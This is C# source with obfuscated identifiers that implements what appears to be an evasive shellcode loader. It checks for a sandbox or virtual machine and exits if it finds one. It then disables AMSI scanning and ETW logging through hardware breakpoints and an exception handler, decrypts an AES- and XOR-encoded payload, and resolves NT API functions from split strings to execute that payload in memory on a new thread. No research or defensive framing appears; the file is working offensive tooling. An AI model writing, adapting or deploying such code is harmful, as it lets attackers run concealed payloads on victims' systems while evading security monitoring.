using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;

namespace MfkzzFrpmx
{
    class RuGPkCBXv
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtAlloc(IntPtr h, ref IntPtr a, IntPtr z, ref IntPtr s, uint t, uint p);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtProt(IntPtr h, ref IntPtr a, ref IntPtr s, uint p, out uint o);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtCreateThreadEx(out IntPtr h, uint a, IntPtr o, IntPtr p, IntPtr s, IntPtr pr, bool c, uint z, uint st, uint e, IntPtr t);

        static void Main(string[] args)
        {

            if (Environment.ProcessorCount < 2) return;
            if (System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName.Length == 0) return;
            // check for common sandbox files/processes
            if (System.IO.File.Exists("C:\\\\windows\\\\system32\\\\Drivers\\\\VBoxMouse.sys")) return;

            _mfs.SetupBypass();
            byte[] enc = new byte[] { 0x9f,0x64,0x6b,0x0b,0x33,0x95,0xe3,0x10,0x4d,0xe3,0x8a,0xb9,0x5d,0x85,0x3f,0x71,0x48,0x01,0xad,0x1d,0x58,0x8b,0x36,0xb9,0x2c,0x42,0xfe,0xe4,0x79,0x49,0xb5,0xfb,0xde,0x74,0x94,0x49,0x4b,0x32,0xed,0xc1,0x69,0x22,0x64,0xe9,0xa3,0x18,0x78,0x51,0x0c,0xe2,0x76,0xbe,0xe5,0xa6,0x6f,0x6e,0xcd,0x6a,0xc4,0xad,0x0f,0x0c,0x7d,0x71,0xb9,0x3b,0xde,0xfb,0x00,0x1a,0x39,0xf1,0x02,0xa5,0x64,0xd5,0xe4,0xf5,0x6e,0xc0 };
            byte[] _mf_s0;
            using (Aes _mfa0 = Aes.Create())
            {
                _mfa0.KeySize = 256; _mfa0.BlockSize = 128;
                _mfa0.Padding = PaddingMode.PKCS7; _mfa0.Mode = CipherMode.CBC;
                _mfa0.Key = new byte[] { 0x30,0x69,0xe9,0x1d,0xea,0x36,0xbb,0x94,0xcf,0x35,0xd8,0x2c,0x5f,0xd4,0x29,0xc0,0x67,0x71,0xb8,0xeb,0x6c,0xbe,0x95,0x58,0x46,0x47,0x09,0xb5,0x60,0xf8,0x41,0xb3 };
                _mfa0.IV = new byte[] { 0x0d,0xc4,0x68,0xce,0x7a,0xee,0xa3,0xc1,0x85,0x83,0xbb,0x59,0x83,0xf9,0xfa,0xc6 };
                using (ICryptoTransform _mfd0 = _mfa0.CreateDecryptor())
                    _mf_s0 = _mfd0.TransformFinalBlock(enc, 0, enc.Length);
            }
            byte[] buf = new byte[_mf_s0.Length];
            byte[] _mfk1 = new byte[] { 0xef,0x52,0x9d,0xb0,0x54,0xbb,0xd2,0xdb,0xeb,0x15,0xcb,0x71,0x8b,0x0e,0x5f,0x17 };
            for (int _i1 = 0; _i1 < _mf_s0.Length; _i1++)
                buf[_i1] = (byte)(_mf_s0[_i1] ^ _mfk1[_i1 % _mfk1.Length]);
            
            // Resolve NT functions via D/Invoke
            var _na = _mfd._mfg<NtAlloc>("nt" + "dll.dll", "NtAl" + "locateVi" + "rtualMe" + "mory");
            var _np = _mfd._mfg<NtProt>("nt" + "dll.dll", "NtPr" + "otectVi" + "rtualMe" + "mory");
            var _nt = _mfd._mfg<NtCreateThreadEx>("nt" + "dll.dll", "NtCr" + "eateThr" + "eadEx");

            IntPtr _h = (IntPtr)(-1);
            IntPtr _addr = IntPtr.Zero;
            IntPtr _size = (IntPtr)buf.Length;

            _na(_h, ref _addr, IntPtr.Zero, ref _size, 0x3000, 0x04); // RW
            Marshal.Copy(buf, 0, _addr, buf.Length);

            uint _old;
            _np(_h, ref _addr, ref _size, 0x20, out _old); // RX

            IntPtr _ht;
            _nt(out _ht, 0x1FFFFF, IntPtr.Zero, _h, _addr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            
            _mfd._mfg<Action<IntPtr, uint>>("ker" + "nel32.dll", "Wait" + "ForSin" + "gleOb" + "ject")(_ht, 0xFFFFFFFF);
        }
    }

    public static class _mfd
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        public static T _mfg<T>(string _mfl, string _mff) where T : Delegate
        {
            IntPtr _mfh = GetModuleHandle(_mfl);
            IntPtr _mfa = _mfp(_mfh, _mff);
            return (T)Marshal.GetDelegateForFunctionPointer(_mfa, typeof(T));
        }

        public static IntPtr _mfp(IntPtr _mfm, string _mfn)
        {
            int _mfi = 0;
            IntPtr _mfe = (IntPtr)(_mfm.ToInt64() + Marshal.ReadInt32((IntPtr)(_mfm.ToInt64() + Marshal.ReadInt32((IntPtr)(_mfm.ToInt64() + 0x3C)) + 0x88)));
            int _mfc = Marshal.ReadInt32((IntPtr)(_mfe.ToInt64() + 0x18));
            IntPtr _mfna = (IntPtr)(_mfm.ToInt64() + Marshal.ReadInt32((IntPtr)(_mfe.ToInt64() + 0x20)));
            IntPtr _mfoo = (IntPtr)(_mfm.ToInt64() + Marshal.ReadInt32((IntPtr)(_mfe.ToInt64() + 0x24)));
            IntPtr _mfea = (IntPtr)(_mfm.ToInt64() + Marshal.ReadInt32((IntPtr)(_mfe.ToInt64() + 0x1C)));
            for (_mfi = 0; _mfi < _mfc; _mfi++)
            {
                string _mfs = Marshal.PtrToStringAnsi((IntPtr)(_mfm.ToInt64() + Marshal.ReadInt32((IntPtr)(_mfna.ToInt64() + _mfi * 4))));
                if (_mfs.Equals(_mfn, StringComparison.OrdinalIgnoreCase))
                {
                    return (IntPtr)(_mfm.ToInt64() + Marshal.ReadInt32((IntPtr)(_mfea.ToInt64() + Marshal.ReadInt16((IntPtr)(_mfoo.ToInt64() + _mfi * 2)) * 4)));
                }
            }
            return IntPtr.Zero;
        }
    }

    public static class _mfs
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr AddVectoredExceptionHandler(uint _mff, IntPtr _mfa);
        [DllImport("kernel32.dll")]
        public static extern bool SetThreadContext(IntPtr _mfh, ref _mfc _mfx);
        [DllImport("kernel32.dll")]
        public static extern bool GetThreadContext(IntPtr _mfh, ref _mfc _mfx);

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct _mfc { 
            public ulong P1, P2, P3, P4, P5, P6; 
            public uint ContextFlags; 
            public uint MxCsr; 
            public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs; 
            public uint EFlags; 
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7; 
            public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10, R11, R12, R13, R14, R15, Rip; 
        }

        private static IntPtr _amA;
        private static IntPtr _etwA;

        public static void SetupBypass() {
            IntPtr _amL = _mfd.GetModuleHandle("am" + "si.dll");
            _amA = _mfd._mfp(_amL, "Am" + "siSc" + "anBu" + "ffer");
            IntPtr _etwL = _mfd.GetModuleHandle("nt" + "dll.dll");
            _etwA = _mfd._mfp(_etwL, "Etw" + "Event" + "Write");
            
            AddVectoredExceptionHandler(1, Marshal.GetFunctionPointerForDelegate((_mfvh)Handler));
            
            _mfc _ctx = new _mfc(); _ctx.ContextFlags = 0x10010; // CONTEXT_DEBUG_REGISTERS
            GetThreadContext((IntPtr)(-2), ref _ctx);
            _ctx.Dr0 = (ulong)_amA;
            _ctx.Dr1 = (ulong)_etwA;
            _ctx.Dr7 = 0x5; // Break on execution for Dr0 and Dr1
            SetThreadContext((IntPtr)(-2), ref _ctx);
        }

        private delegate long _mfvh(IntPtr _mfe);
        private static long Handler(IntPtr _mfe) {
            if (Marshal.ReadInt32(_mfe) == unchecked((int)0x80000004)) {
                IntPtr _ctxP = Marshal.ReadIntPtr((IntPtr)(_mfe.ToInt64() + 8));
                ulong _rip = (ulong)Marshal.ReadInt64((IntPtr)(_ctxP.ToInt64() + 0xF8)); // Rip
                if (_rip == (ulong)_amA) {
                    Marshal.WriteInt64((IntPtr)(_ctxP.ToInt64() + 0x78), 0); // Rax = CLEAN
                    Marshal.WriteInt64((IntPtr)(_ctxP.ToInt64() + 0xF8), (long)_rip + 3);
                    return -1;
                }
                if (_rip == (ulong)_etwA) {
                    Marshal.WriteInt64((IntPtr)(_ctxP.ToInt64() + 0x78), 0);
                    Marshal.WriteInt64((IntPtr)(_ctxP.ToInt64() + 0xF8), (long)_rip + 3);
                    return -1;
                }
            }
            return 0;
        }
    }

}